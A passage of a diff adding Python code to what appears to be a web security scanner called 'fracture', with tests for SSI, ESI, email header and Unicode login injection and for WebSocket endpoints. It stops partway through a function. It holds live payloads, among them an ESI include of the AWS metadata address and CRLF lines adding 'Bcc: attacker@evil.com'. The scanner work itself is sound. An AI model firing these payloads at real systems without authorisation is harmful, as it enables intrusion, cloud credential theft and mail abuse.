+    forms   = crawl_data.get("forms", [])
+    params  = crawl_data.get("params", [])
+
+    _tested = 0
+    _found: set = set()
+
+    # Test form fields
+    for form in forms[:10]:
+        action = form.get("action", url)
+        inputs = form.get("inputs", [])
+        for inp in inputs:
+            pname = inp.get("name", "")
+            if not pname or _tested >= 10:
+                continue
+            _tested += 1
+            for payload, plabel in _SSI_PAYLOADS:
+                try:
+                    data = {i["name"]: "test" for i in inputs if i.get("name")}
+                    data[pname] = payload
+                    r = sess.post(action, data=data, timeout=timeout)
+                    if r is None:
+                        continue
+                    # Strip payload reflections
+                    _body = r.text
+                    for _enc in (payload,
+                                 urllib.parse.quote(payload),
+                                 urllib.parse.quote_plus(payload)):
+                        _body = _body.replace(_enc, "")
+                    if _SSI_SUCCESS_RE.search(_body) and action not in _found:
+                        _found.add(action)
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"ssi_{plabel}_{pname}", r,
+                            endpoint_url=action, method="POST")
+                        out.add_finding(
+                            title="Server-Side Include (SSI) Injection",
+                            url=action, port=target["port"], risk="CRITICAL",
+                            description=(
+                                f"Field '{pname}' at {action} is vulnerable to SSI "
+                                f"injection. The payload '{payload}' was processed by "
+                                f"the server's SSI engine, producing output that was "
+                                f"not simply reflected. SSI injection can lead to "
+                                f"remote code execution, file disclosure, and "
+                                f"server-side information leakage."
+                            ),
+                            output=(
+                                f"Field: {pname}\nPayload: {payload}\n"
+                                f"Response ({r.status_code}): {_body[:500]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-ssi-injection",
+                            service=target["scheme"],
+                            affected=action,
+                            owasp="A03:2025 Injection", nist="SI-10",
+                            remediation=(
+                                "Disable SSI processing for user-uploaded content and "
+                                "user-controlled input fields. If SSI must be used, "
+                                "sanitise all input to remove SSI directives "
+                                "(<!--# ... -->). Configure the web server to restrict "
+                                "SSI exec directives."
+                            ),
+                            cwe=["CWE-97"],
+                            cvss_score=9.8,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                        )
+                        vc.log(f"[injection] SSI injection via {pname} at {action}",
+                               "SUCCESS")
+                        break
+                except Exception:
+                    pass
+
+    # Also test URL parameters
+    for entry in params[:5]:
+        purl = entry.get("url", "")
+        for param in entry.get("params", []):
+            if _tested >= 10:
+                break
+            _tested += 1
+            for payload, plabel in _SSI_PAYLOADS[:2]:  # echo only for GET
+                try:
+                    r = _qs_inject(purl, param, payload, sess, timeout)
+                    if r is None:
+                        continue
+                    _body = r.text
+                    for _enc in (payload,
+                                 urllib.parse.quote(payload),
+                                 urllib.parse.quote_plus(payload)):
+                        _body = _body.replace(_enc, "")
+                    if _SSI_SUCCESS_RE.search(_body) and purl not in _found:
+                        _found.add(purl)
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"ssi_{plabel}_{param}", r,
+                            endpoint_url=purl, method="GET")
+                        out.add_finding(
+                            title="Server-Side Include (SSI) Injection",
+                            url=purl, port=target["port"], risk="CRITICAL",
+                            description=(
+                                f"Parameter '{param}' at {purl} is vulnerable to SSI "
+                                f"injection via GET request."
+                            ),
+                            output=(
+                                f"Parameter: {param}\nPayload: {payload}\n"
+                                f"Response ({r.status_code}): {_body[:500]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-ssi-injection",
+                            service=target["scheme"],
+                            affected=purl,
+                            owasp="A03:2025 Injection", nist="SI-10",
+                            cvss_score=9.8,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                            cwe=["CWE-97"],
+                            remediation=(
+                                "Disable SSI processing for user-controlled input. "
+                                "Sanitise all input to strip SSI directives."
+                            ),
+                        )
+                        vc.log(f"[injection] SSI injection via {param} at {purl}",
+                               "SUCCESS")
+                        break
+                except Exception:
+                    pass
+
+    vc.log(f"[injection] SSI injection scan complete ({len(_found)} findings)", "INFO")
+
+
+# ─────────────────────────────────────────────
+# Edge Side Include (ESI) Injection
+# ─────────────────────────────────────────────
+
+_ESI_CDN_HEADERS = re.compile(
+    r"X-Cache|X-Varnish|X-CDN|Via.*varnish|Via.*squid|"
+    r"Surrogate-Control|X-Akamai|X-Fastly|X-Edge",
+    re.I,
+)
+
+_ESI_PAYLOADS = [
+    ('<esi:include src="http://127.0.0.1/" />', "localhost",
+     "Internal content from localhost"),
+    ('<esi:include src="http://169.254.169.254/latest/meta-data/" />', "imds",
+     "AWS IMDS metadata access via ESI"),
+    ("<esi:assign name=\"var1\" value=\"fracture_esi_test\"/>$(var1)", "assign",
+     "ESI variable assignment"),
+]
+
+
+def _test_esi_injection(target: dict, cfg: dict,
+                        out: "OutputManager",
+                        sess: "requests.Session",
+                        crawl_data: dict) -> None:
+    """Test Edge Side Include (ESI) injection when CDN/cache layer is detected."""
+    phase   = "injection"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    forms   = crawl_data.get("forms", [])
+    params  = crawl_data.get("params", [])
+
+    # Check if CDN/cache layer is present
+    _has_cdn = bool(target.get("cdn"))
+    if not _has_cdn:
+        try:
+            _probe = sess.get(url, timeout=timeout)
+            for _hdr in _probe.headers:
+                if _ESI_CDN_HEADERS.search(_hdr):
+                    _has_cdn = True
+                    break
+            # Also check Surrogate-Control header for ESI support
+            if "Surrogate-Control" in _probe.headers:
+                _has_cdn = True
+        except Exception:
+            pass
+
+    if not _has_cdn:
+        vc.log("[injection] ESI: No CDN/cache layer detected — skipping ESI tests",
+               "INFO")
+        return
+
+    vc.log("[injection] ESI: CDN/cache layer detected — testing for ESI injection",
+           "INFO")
+
+    _found: set = set()
+    _tested = 0
+
+    # Test form fields
+    for form in forms[:5]:
+        action = form.get("action", url)
+        inputs = form.get("inputs", [])
+        for inp in inputs:
+            pname = inp.get("name", "")
+            if not pname or _tested >= 5:
+                continue
+            _tested += 1
+            for payload, plabel, pdesc in _ESI_PAYLOADS:
+                try:
+                    data = {i["name"]: "test" for i in inputs if i.get("name")}
+                    data[pname] = payload
+                    r = sess.post(action, data=data, timeout=timeout)
+                    if r is None:
+                        continue
+                    # Strip payload reflections
+                    _body = r.text
+                    for _enc in (payload,
+                                 urllib.parse.quote(payload),
+                                 urllib.parse.quote_plus(payload)):
+                        _body = _body.replace(_enc, "")
+                    # Check for signs ESI was processed
+                    _processed = False
+                    if plabel == "assign" and "fracture_esi_test" in _body:
+                        _processed = True
+                    elif plabel == "localhost" and (
+                            "<html" in _body.lower() or
+                            len(_body) > len(r.text) * 0.1):
+                        _processed = True
+                    elif plabel == "imds" and (
+                            "ami-id" in _body or "instance-id" in _body or
+                            "security-credentials" in _body):
+                        _processed = True
+
+                    if _processed and action not in _found:
+                        _found.add(action)
+                        _risk = "CRITICAL" if plabel == "imds" else "HIGH"
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"esi_{plabel}_{pname}", r,
+                            endpoint_url=action, method="POST")
+                        out.add_finding(
+                            title=f"Edge Side Include (ESI) Injection — {pdesc}",
+                            url=action, port=target["port"], risk=_risk,
+                            description=(
+                                f"Field '{pname}' at {action} is vulnerable to ESI "
+                                f"injection. The CDN/cache layer processed the ESI "
+                                f"directive, allowing server-side request forgery, "
+                                f"information disclosure, and potentially XSS through "
+                                f"the cache infrastructure."
+                            ),
+                            output=(
+                                f"Field: {pname}\nPayload: {payload}\n"
+                                f"Response ({r.status_code}): {_body[:500]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-esi-injection",
+                            service=target["scheme"],
+                            affected=action,
+                            owasp="A03:2025 Injection", nist="SI-10",
+                            cvss_score=7.5,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                            cwe=["CWE-94"],
+                            remediation=(
+                                "Configure the CDN/cache layer to reject or strip ESI "
+                                "directives from user-supplied content. Disable ESI "
+                                "processing where not required. Validate and sanitise "
+                                "all user input before it reaches the cache layer."
+                            ),
+                        )
+                        vc.log(f"[injection] ESI injection via {pname} at {action}",
+                               "SUCCESS")
+                        break
+                except Exception:
+                    pass
+
+    # Test URL parameters
+    for entry in params[:3]:
+        purl = entry.get("url", "")
+        for param in entry.get("params", []):
+            if _tested >= 5:
+                break
+            _tested += 1
+            for payload, plabel, pdesc in _ESI_PAYLOADS[:1]:
+                try:
+                    r = _qs_inject(purl, param, payload, sess, timeout)
+                    if r is None:
+                        continue
+                    _body = r.text
+                    for _enc in (payload,
+                                 urllib.parse.quote(payload)):
+                        _body = _body.replace(_enc, "")
+                    if ("<html" in _body.lower() and purl not in _found):
+                        _found.add(purl)
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"esi_{plabel}_{param}", r,
+                            endpoint_url=purl, method="GET")
+                        out.add_finding(
+                            title=f"Edge Side Include (ESI) Injection — {pdesc}",
+                            url=purl, port=target["port"], risk="HIGH",
+                            description=(
+                                f"Parameter '{param}' at {purl} is vulnerable to ESI "
+                                f"injection via GET request."
+                            ),
+                            output=(
+                                f"Parameter: {param}\nPayload: {payload}\n"
+                                f"Response ({r.status_code}): {_body[:500]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-esi-injection",
+                            service=target["scheme"],
+                            affected=purl,
+                            owasp="A03:2025 Injection", nist="SI-10",
+                            cvss_score=7.5,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                            cwe=["CWE-94"],
+                            remediation=(
+                                "Strip ESI directives from user-supplied content at "
+                                "the CDN/cache layer. Disable ESI where not required."
+                            ),
+                        )
+                        vc.log(f"[injection] ESI injection via {param} at {purl}",
+                               "SUCCESS")
+                        break
+                except Exception:
+                    pass
+
+    vc.log(f"[injection] ESI injection scan complete ({len(_found)} findings)", "INFO")
+
+
+# ─────────────────────────────────────────────
+# Email / SMTP Header Injection
+# ─────────────────────────────────────────────
+
+_EMAIL_FIELD_RE = re.compile(
+    r"e[-_]?mail|^to$|^cc$|^bcc$|^subject$|^from$|"
+    r"contact|message|recipient|sender|reply",
+    re.I,
+)
+
+_SMTP_ERROR_RE = re.compile(
+    r"smtp|mail.*header|header.*inject|invalid.*recipient|"
+    r"relay|envelope|mailer|sendmail|postfix|exim|"
+    r"Bcc.*attacker|additional.*header",
+    re.I,
+)
+
+
+def _test_email_header_injection(target: dict, cfg: dict,
+                                 out: "OutputManager",
+                                 sess: "requests.Session",
+                                 crawl_data: dict) -> None:
+    """Test for SMTP/email header injection in contact/email forms."""
+    phase   = "injection"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    forms   = crawl_data.get("forms", [])
+
+    _found: set = set()
+    _tested = 0
+
+    for form in forms[:10]:
+        action = form.get("action", url)
+        inputs = form.get("inputs", [])
+
+        # Find email-related fields
+        _email_fields = [
+            inp for inp in inputs
+            if inp.get("name") and _EMAIL_FIELD_RE.search(inp["name"])
+        ]
+        if not _email_fields or _tested >= 5:
+            continue
+        _tested += 1
+
+        for inp in _email_fields:
+            pname = inp.get("name", "")
+            if not pname:
+                continue
+
+            # Get baseline (normal submission)
+            _bl_data = {i["name"]: "test" for i in inputs if i.get("name")}
+            if _EMAIL_FIELD_RE.search(pname):
+                _bl_data[pname] = "test@example.com"
+            try:
+                _bl = sess.post(action, data=_bl_data, timeout=timeout)
+            except Exception:
+                continue
+
+            _payloads = [
+                ("test@example.com\r\nBcc: attacker@evil.com", "CRLF"),
+                ("test@example.com%0d%0aBcc: attacker@evil.com", "URL-encoded CRLF"),
+                ("test@example.com\nBcc: attacker@evil.com", "LF-only"),
+            ]
+
+            for payload, plabel in _payloads:
+                try:
+                    data = {i["name"]: "test" for i in inputs if i.get("name")}
+                    data[pname] = payload
+                    r = sess.post(action, data=data, timeout=timeout)
+                    if r is None:
+                        continue
+
+                    _injected = False
+                    # Check 1: SMTP-related error messages
+                    if _SMTP_ERROR_RE.search(r.text):
+                        _injected = True
+                    # Check 2: Different response than baseline (header was
+                    # processed differently)
+                    if (r.status_code != _bl.status_code and
+                            r.status_code in (500, 400, 422)):
+                        _injected = True
+                    # Check 3: Response indicates mail was sent to extra recipient
+                    if re.search(r"attacker@evil\.com|additional.*recipient",
+                                 r.text, re.I):
+                        _injected = True
+
+                    if _injected and action not in _found:
+                        _found.add(action)
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"email_inject_{pname}", r,
+                            endpoint_url=action, method="POST")
+                        out.add_finding(
+                            title="Email Header Injection",
+                            url=action, port=target["port"], risk="HIGH",
+                            description=(
+                                f"Field '{pname}' at {action} is vulnerable to email "
+                                f"header injection via {plabel}. An attacker can inject "
+                                f"additional email headers (Bcc, Cc, Subject, etc.) to "
+                                f"send spam, phishing emails, or exfiltrate data through "
+                                f"the application's mail function."
+                            ),
+                            output=(
+                                f"Field: {pname}\nPayload: {payload!r}\n"
+                                f"Baseline: HTTP {_bl.status_code}\n"
+                                f"Injected: HTTP {r.status_code}\n"
+                                f"Response: {r.text[:400]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-email-injection",
+                            service=target["scheme"],
+                            affected=action,
+                            owasp="A03:2025 Injection", nist="SI-10",
+                            remediation=(
+                                "Validate all email-related input fields to reject "
+                                "CR/LF characters (\\r\\n). Use a well-tested mail "
+                                "library that escapes header values. Never construct "
+                                "email headers from raw user input."
+                            ),
+                            cwe=["CWE-93"],
+                            cvss_score=7.5,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                        )
+                        vc.log(f"[injection] Email header injection via {pname} "
+                               f"at {action}", "SUCCESS")
+                        break
+                except Exception:
+                    pass
+
+    vc.log(f"[injection] Email header injection scan complete "
+           f"({len(_found)} findings)", "INFO")
+
+
+# ─────────────────────────────────────────────
+# Unicode Normalization Bypass in Authentication
+# ─────────────────────────────────────────────
+
+# Unicode lookalikes for "admin" that may normalise to "admin" under NFKC/NFKD
+_UNICODE_ADMIN_VARIANTS = [
+    ("ⓐdmin",  "circled-a"),        # ⓐdmin
+    ("\U0001d41admin", "bold-a"),        # 𝐚dmin
+    ("admin​", "zero-width-space"), # admin + ZWSP
+    ("ａdmin",  "fullwidth-a"),      # ａdmin
+    ("ȧdmin", "combining-dot"),    # ȧdmin (a + combining dot above)
+    ("Admın",  "dotless-i"),       # Admın
+]
+
+_LOGIN_FIELD_RE = re.compile(
+    r"user|login|email|account|name|username|uid|ident",
+    re.I,
+)
+
+
+def _test_unicode_normalization(target: dict, cfg: dict,
+                                out: "OutputManager",
+                                sess: "requests.Session",
+                                crawl_data: dict) -> None:
+    """Test Unicode normalization bypasses in authentication fields."""
+    phase   = "injection"
+    timeout = cfg.get("timeout", 10)
+    auth    = cfg.get("auth", {})
+
+    # Find login URL
+    login_url = auth.get("login_url", "").strip()
+    if not login_url:
+        # Try to find from crawl data
+        forms = crawl_data.get("forms", [])
+        for form in forms:
+            inputs = form.get("inputs", [])
+            _has_password = any(
+                i.get("type") == "password" for i in inputs
+            )
+            _has_user = any(
+                _LOGIN_FIELD_RE.search(i.get("name", "")) for i in inputs
+            )
+            if _has_password and _has_user:
+                login_url = form.get("action", "")
+                break
+
+    if not login_url:
+        vc.log("[injection] Unicode normalization: no login URL found — skipping",
+               "INFO")
+        return
+
+    vc.log(f"[injection] Unicode normalization: testing {login_url}", "INFO")
+
+    # Find the login form and its fields
+    _login_form = None
+    forms = crawl_data.get("forms", [])
+    for form in forms:
+        if form.get("action", "").rstrip("/") == login_url.rstrip("/"):
+            _login_form = form
+            break
+
+    if not _login_form:
+        # Fetch the login page and parse
+        try:
+            _lp = sess.get(login_url, timeout=timeout)
+            # Simple form extraction — look for password field
+            _pwd_match = re.search(
+                r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)',
+                _lp.text, re.I,
+            )
+            _user_match = re.search(
+                r'<input[^>]+(?:type=["\'](?:text|email)["\'])?[^>]*'
+                r'name=["\']([^"\']+)["\']',
+                _lp.text, re.I,
+            )
+            if _pwd_match and _user_match:
+                _login_form = {
+                    "action": login_url,
+                    "method": "POST",
+                    "inputs": [
+                        {"name": _user_match.group(1), "type": "text"},
+                        {"name": _pwd_match.group(1), "type": "password"},
+                    ],
+                }
+        except Exception:
+            pass
+
+    if not _login_form:
+        vc.log("[injection] Unicode normalization: cannot parse login form — skipping",
+               "INFO")
+        return
+
+    inputs = _login_form.get("inputs", [])
+    _user_field = None
+    _pwd_field = None
+    for inp in inputs:
+        if inp.get("type") == "password":
+            _pwd_field = inp.get("name")
+        elif _LOGIN_FIELD_RE.search(inp.get("name", "")):
+            _user_field = inp.get("name")
+
+    if not _user_field or not _pwd_field:
+        return
+
+    action = _login_form.get("action", login_url)
+
+    # Get baseline with a clearly-invalid username
+    try:
+        _bl_data = {_user_field: "fracture_invalid_user_xyzzy",
+                    _pwd_field: "fracture_invalid_pass"}
+        _bl = sess.post(action, data=_bl_data, timeout=timeout)
+        _bl_status = _bl.status_code
+        _bl_len = len(_bl.text)
+    except Exception:
+        return
+
+    for variant, label in _UNICODE_ADMIN_VARIANTS:
+        try:
+            data = {_user_field: variant, _pwd_field: "fracture_invalid_pass"}
+            r = sess.post(action, data=data, timeout=timeout)
+            if r is None:
+                continue
+
+            # Compare against baseline — different response suggests the server
+            # normalised the Unicode variant and treated it differently
+            _diff_status = r.status_code != _bl_status
+            _diff_len = abs(len(r.text) - _bl_len) > max(20, _bl_len * 0.15)
+            # Check for "account locked" or "too many attempts" (normalised to
+            # a real user) vs generic "invalid credentials"
+            _user_exists_indicators = re.compile(
+                r"locked|disabled|suspended|too many|attempt|"
+                r"password.*incorrect|wrong password|"
+                r"reset.*password|forgot",
+                re.I,
+            )
+            _suggests_user_exists = (
+                _user_exists_indicators.search(r.text) and
+                not _user_exists_indicators.search(_bl.text)
+            )
+
+            if (_diff_status or _diff_len or _suggests_user_exists):
+                _rq, _rp = _save_http_evidence(
+                    out, phase, f"unicode_norm_{label}", r,
+                    endpoint_url=action, method="POST")
+                out.add_finding(
+                    title="Unicode Normalization Bypass in Authentication",
+                    url=action, port=target["port"], risk="HIGH",
+                    description=(
+                        f"The login form at {action} responds differently to "
+                        f"Unicode variant '{variant}' ({label}) of a username "
+                        f"compared to a clearly invalid username. This suggests "
+                        f"the application normalises Unicode input before "
+                        f"authentication lookup, which can be exploited to "
+                        f"bypass username restrictions, impersonate users with "
+                        f"visually similar usernames, or enumerate valid accounts."
+                    ),
+                    output=(
+                        f"Field: {_user_field}\n"
+                        f"Variant: {variant!r} ({label})\n"
+                        f"Baseline (invalid user): HTTP {_bl_status} ({_bl_len} bytes)\n"
+                        f"Unicode variant: HTTP {r.status_code} ({len(r.text)} bytes)\n"
+                        f"Response excerpt: {r.text[:300]}"
+                    ),
+                    output_file=f"{_rq},{_rp}",
+                    sources="fracture-unicode-normalization",
+                    service=target["scheme"],
+                    affected=action,
+                    owasp="A07:2025 Identification and Authentication Failures",
+                    nist="IA-5",
+                    remediation=(
+                        "Apply Unicode NFKC normalization to usernames BEFORE "
+                        "database lookup and authentication. Reject input containing "
+                        "zero-width characters, combining marks, and non-standard "
+                        "Unicode codepoints in authentication fields. Use a canonical "
+                        "form for username comparison."
+                    ),
+                    cwe=["CWE-176"],
+                    cvss_score=7.5,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                )
+                vc.log(f"[injection] Unicode normalization bypass ({label}) at "
+                       f"{action}", "SUCCESS")
+                break  # one variant is enough to confirm the issue
+        except Exception:
+            pass
+
+    vc.log("[injection] Unicode normalization scan complete", "INFO")
+
+# ── WebSocket / Cache Deception / OAuth ──────────────────────────────
+
+# =============================================================================
+# Phase: WebSocket Security Testing
+# =============================================================================
+# CWE-1385: Missing Origin Validation in WebSockets
+# CWE-306:  Missing Authentication for Critical Function
+
+def _phase_websocket(target: dict, cfg: dict, pm: ProgressManager,
+                     out: OutputManager, sess: requests.Session,
+                     crawl_data: dict) -> None:
+    """WebSocket security testing — discovery, auth, origin, message injection."""
+    import socket as _sock, ssl as _ssl2, select as _sel2
+    import hashlib as _hashlib, base64 as _b64ws, struct as _struct_ws
+
+    phase    = "websocket"
+    url      = target["url"]
+    hostname = target["hostname"]
+    port     = target["port"]
+    scheme   = target["scheme"]
+    timeout  = cfg.get("timeout", 10)
+    use_tls  = scheme == "https"
+
+    vc.status(phase, "WebSocket Testing", "running", "Discovery", 0, 4)
+
+    # ── Helpers ───────────────────────────────────────────────────────────
+
+    def _ws_connect(host, p, tls, connect_timeout=None):
+        ct = connect_timeout or timeout
+        sock = _sock.create_connection((host, p), timeout=ct)
+        sock.settimeout(None)
+        if tls:
+            ctx = _ssl2.create_default_context()
+            if not cfg.get("verify_ssl", False):
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl2.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+        return sock
+
+    def _ws_recv(sock, max_wait=5.0):
+        buf = b""
+        deadline = time.time() + max_wait
+        while time.time() < deadline:
+            rem = max(deadline - time.time(), 0.05)
+            ready = _sel2.select([sock], [], [], min(rem, 1.0))
+            if not ready[0]:
+                if buf:
+                    break
+                continue
+            try:
+                chunk = sock.recv(8192)
+            except (_sock.error, _ssl2.SSLError, OSError):
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if b"\r\n\r\n" in buf:
+                # Read a short tail for any immediate WS frame
+                _tail_end = time.time() + 0.5
+                while time.time() < _tail_end:
+                    r2 = _sel2.select([sock], [], [], 0.3)
+                    if not r2[0]:
+                        break
+                    try:
+                        c2 = sock.recv(8192)
+                    except (_sock.error, _ssl2.SSLError, OSError):
+                        break
+                    if not c2:
+                        break
+                    buf += c2
+                break
+        return buf
+
+    def _ws_close(sock):
+        try:
+            sock.close()
+        except Exception:
+            pass
+
+    def _ws_status(raw: bytes) -> int:
+        try:
+            return int(raw.split(b"\r\n")[0].split()[1])
+        except (IndexError, ValueError):
+            return 0
+
+    def _ws_handshake(path, origin=None, cookies=None, extra_headers=None):
+        """Build a WebSocket upgrade request."""
+        ws_key = _b64ws.b64encode(os.urandom(16)).decode()
+        lines = [
+            f"GET {path} HTTP/1.1",
+            f"Host: {hostname}:{port}" if port not in (80, 443) else f"Host: {hostname}",
+            "Upgrade: websocket",
+            "Connection: Upgrade",
+            f"Sec-WebSocket-Key: {ws_key}",
+            "Sec-WebSocket-Version: 13",
+        ]
+        if origin:
+            lines.append(f"Origin: {origin}")
+        else:
+            lines.append(f"Origin: {scheme}://{hostname}")
+        if cookies:
+            lines.append(f"Cookie: {cookies}")
+        if extra_headers:
+            for k, v in extra_headers.items():
+                lines.append(f"{k}: {v}")
+        lines.append("")
+        lines.append("")
+        return ("\r\n".join(lines)).encode(), ws_key
+
+    def _ws_send_text(sock, msg):
+        """Send a masked WebSocket text frame."""
+        payload = msg.encode("utf-8")
+        mask_key = os.urandom(4)
+        masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
+        frame = bytearray()
+        frame.append(0x81)  # FIN + text opcode
+        plen = len(payload)
+        if plen < 126:
+            frame.append(0x80 | plen)  # masked
+        elif plen < 65536:
+            frame.append(0x80 | 126)
+            frame.extend(_struct_ws.pack("!H", plen))
+        else:
+            frame.append(0x80 | 127)
+            frame.extend(_struct_ws.pack("!Q", plen))
+        frame.extend(mask_key)
+        frame.extend(masked)
+        sock.sendall(bytes(frame))
+
+    def _ws_read_frame(sock, max_wait=3.0):
+        """Read a single WebSocket frame, return decoded text or None."""
+        deadline = time.time() + max_wait
+        buf = b""
+        while time.time() < deadline:
+            rem = max(deadline - time.time(), 0.05)
+            ready = _sel2.select([sock], [], [], min(rem, 0.5))
+            if not ready[0]:
+                if buf:
+                    break
+                continue
+            try:
+                chunk = sock.recv(8192)
+            except (_sock.error, _ssl2.SSLError, OSError):
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if len(buf) >= 2:
+                break
+        if len(buf) < 2:
+            return None
+        try:
+            opcode = buf[0] & 0x0F
+            masked = bool(buf[1] & 0x80)
+            plen = buf[1] & 0x7F
+            offset = 2
+            if plen == 126:
+                if len(buf) < 4:
+                    return None
+                plen = _struct_ws.unpack("!H", buf[2:4])[0]
+                offset = 4
+            elif plen == 127:
+                if len(buf) < 10:
+                    return None
+                plen = _struct_ws.unpack("!Q", buf[2:10])[0]
+                offset = 10
+            if masked:
+                mask = buf[offset:offset + 4]
+                offset += 4
+                data = bytes(b ^ mask[i % 4] for i, b in enumerate(buf[offset:offset + plen]))
+            else:
+                data = buf[offset:offset + plen]
+            if opcode == 1:  # text
+                return data.decode("utf-8", errors="replace")
+            return data.hex()[:200]
+        except Exception:
+            return None
+
+    # ── Step 1: Discovery ─────────────────────────────────────────────────
+
+    _ws_paths = ["/ws", "/websocket", "/socket.io/", "/signalr/",
+                 "/signalr/negotiate", "/hub", "/cable",
+                 "/graphql", "/subscriptions"]
+    # Extract WS endpoints from JS/HTML in crawl_data
+    _ws_from_js: list = []
+    for lnk in crawl_data.get("links", []):
+        if lnk.endswith(".js"):
+            try:
+                r = sess.get(lnk, timeout=timeout)
+                if r and r.status_code == 200:
+                    for m in re.finditer(r"""(?:new\s+WebSocket|ws[s]?://)(["'`])([^"'`\s]{5,200})\1""", r.text):
+                        _ws_from_js.append(m.group(2))
+                    for m in re.finditer(r"""ws[s]?://[^\s"'`<>]{5,200}""", r.text):
+                        _ws_from_js.append(m.group(0))
+            except Exception:
+                pass
+    # Also scan the base page HTML
+    try:
+        _base_r = sess.get(url, timeout=timeout)
+        if _base_r and _base_r.status_code == 200:
+            for m in re.finditer(r"""ws[s]?://[^\s"'`<>]{5,200}""", _base_r.text):
+                _ws_from_js.append(m.group(0))
+    except Exception:
+        pass
+
+    # Deduplicate and extract paths from full WS URLs
+    for ws_url in _ws_from_js:
+        try:
+            if ws_url.startswith("ws://") or ws_url.startswith("wss://"):
+                parsed = urllib.parse.urlparse(ws_url)
+                if parsed.hostname == hostname and parsed.path and parsed.path not in _ws_paths:
+                    _ws_paths.append(parsed.path)
+            elif ws_url.startswith("/") and ws_url not in _ws_paths:
+                _ws_paths.append(ws_url)
+        except Exception:
+            pass
+
+    _cookies = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
+    _discovered_ws: list = []  # list of {"path": str, "status": int}
+
+    for ws_path in _ws_paths:
+        try:
+            sock = _ws_connect(hostname, port, use_tls)
+            req, _key = _ws_handshake(ws_path, cookies=_cookies)
+            sock.sendall(req)
+            resp = _ws_recv(sock, max_wait=timeout)
+            code = _ws_status(resp)
+            _ws_close(sock)
+            if code == 101:
+                _discovered_ws.append({"path": ws_path, "status": code})
+                vc.log(f"[websocket] Discovered WS endpoint: {ws_path} (101)", "SUCCESS")
+            elif code in (200, 400, 426):
+                # 400/426 = upgrade required or version mismatch — endpoint exists
+                _discovered_ws.append({"path": ws_path, "status": code})
+                vc.log(f"[websocket] Potential WS endpoint: {ws_path} ({code})", "INFO")
+        except Exception:
+            pass
+
+    if not _discovered_ws:
+        vc.status(phase, "WebSocket Testing", "complete", "No WS endpoints found", 4, 4)
+        vc.log("[websocket] No WebSocket endpoints discovered — phase complete", "INFO")
+        return
+
+    vc.log(f"[websocket] Discovered {len(_discovered_ws)} WS endpoint(s)", "SUCCESS")
+
+    # ── Step 2: Auth check ────────────────────────────────────────────────
+    vc.status(phase, "WebSocket Testing", "running", "Auth check", 1, 4)
+
+    for ep in _discovered_ws:
+        if ep["status"] != 101:
+            continue
+        try:
+            sock = _ws_connect(hostname, port, use_tls)
+            # Send without cookies
+            req, _key = _ws_handshake(ep["path"], cookies=None)
+            sock.sendall(req)
+            resp = _ws_recv(sock, max_wait=timeout)
+            code = _ws_status(resp)
+            _ws_close(sock)
+            if code == 101:
+                _ev_content = (
+                    f"WebSocket upgrade to {ep['path']} succeeded without authentication.\n\n"
+                    f"Request (no cookies):\n{req.decode('utf-8', errors='replace')}\n\n"
+                    f"Response:\n{resp.decode('utf-8', errors='replace')[:2000]}"
+                )
+                _ev_path = ""
+                try:
+                    d = out.root / phase
+                    d.mkdir(parents=True, exist_ok=True)
+                    fp = d / f"ws_noauth_{re.sub(r'[^a-zA-Z0-9_]', '_', ep['path'])[:40]}.txt"
+                    fp.write_text(_ev_content)
+                    _ev_path = str(fp.relative_to(out.root))
+                except Exception:
+                    pass
+                out.add_finding(
+                    title="WebSocket Endpoint Missing Authentication",
+                    url=f"{scheme}://{hostname}:{port}{ep['path']}",
+                    port=target["port"], risk="HIGH",
+                    description=(
+                        f"The WebSocket endpoint at {ep['path']} accepted an upgrade "
+                        f"request without any authentication cookies or tokens. An attacker "
+                        f"can connect directly and interact with the WebSocket API without "
+                        f"authenticating."
+                    ),
+                    output=f"Path: {ep['path']}\nUpgrade without cookies: HTTP 101 (success)",
+                    output_file=_ev_path,
+                    sources="fracture-websocket", service=target["scheme"],
+                    affected=f"{scheme}://{hostname}:{port}{ep['path']}",
+                    owasp="A07:2025 Identification and Authentication Failures",
+                    nist="IA-9",
+                    cvss_score=7.5,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                    cwe=["CWE-306"],
+                    remediation=(
+                        "Require authentication for WebSocket upgrade requests. Validate "
+                        "session tokens or auth headers before accepting the connection."
+                    ),
+                )
+                vc.log(f"[websocket] No auth required for {ep['path']}", "SUCCESS")
+        except Exception:
+            pass
+
+    # ── Step 3: Origin validation ─────────────────────────────────────────
+    vc.status(phase, "WebSocket Testing", "running", "Origin validation", 2, 4)
+
+    for ep in _discovered_ws:
+        if ep["status"] != 101:
+            continue
+        try:
+            sock = _ws_connect(hostname, port, use_tls)
+            req, _key = _ws_handshake(ep["path"],
